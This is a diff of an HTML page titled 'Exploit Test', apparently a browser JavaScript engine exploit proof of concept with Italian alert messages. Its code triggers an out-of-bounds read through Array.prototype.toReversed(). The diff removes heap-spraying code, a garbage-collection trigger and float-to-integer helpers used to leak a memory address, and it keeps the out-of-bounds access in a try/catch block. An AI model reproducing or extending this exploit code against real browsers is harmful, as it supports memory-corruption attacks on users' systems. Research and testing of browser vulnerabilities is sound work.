@@ -9,55 +9,29 @@
             return new Promise(resolve => setTimeout(resolve, seconds * 1000));
         }
 
-        function gc() {
-            new Uint8Array(4 * 1024 * 1024);
-        }
-
-        function hex(val) {
-            return "0x" + val.toString(16);
-        }
-
-        function f2i(val) {
-            let buffer = new ArrayBuffer(8);
-            let floatView = new Float64Array(buffer);
-            let intView = new BigUint64Array(buffer);
-            floatView[0] = val;
-            return intView[0];
-        }
-
         async function exploit() {
             alert("Inizio exploit...");
 
             const v1 = [-1n];
             let v2;
 
-            alert("Usando toReversed() per v1");
-            v2 = v1.toReversed(); 
+            try {
+                alert("Usando toReversed() per v1");
+                v2 = v1.toReversed(); 
 
-            alert("Descrizione di v2: " + JSON.stringify(v2));
-            await sleepSeconds(5);
-            alert("Accesso a v2[2]: " + (v2[2]?.toString() || "undefined"));
-
-            let spray_arr = new Array(0x20);
-            for (let i = 0; i < 0x40; i++) {
-                spray_arr[i] = [2.1 * i, 2.2, 2.3];
+                alert("Descrizione di v2: " + JSON.stringify(v2));
+                await sleepSeconds(5);
+                alert("Accesso a v2[2]: " + (v2[2]?.toString() || "undefined"));
+            } catch (e) {
+                alert("Errore: " + e.message);
             }
-            gc();
-
-            let b1 = [1.1];
-
-            alert("Usando toReversed() per b1");
-            b1 = b1.toReversed();
-
-            let addr1 = f2i(b1[1]);
-            alert("leak1: " + hex(addr1));
 
             alert("Exploit completato!");
         }
     </script>
 </head>
 <body>
-    <h1>Exploit Test2</h1>
+    <h1>Exploit Test</h1>
     <button onclick="exploit()">Esegui Exploit</button>
 </body>
 </html>
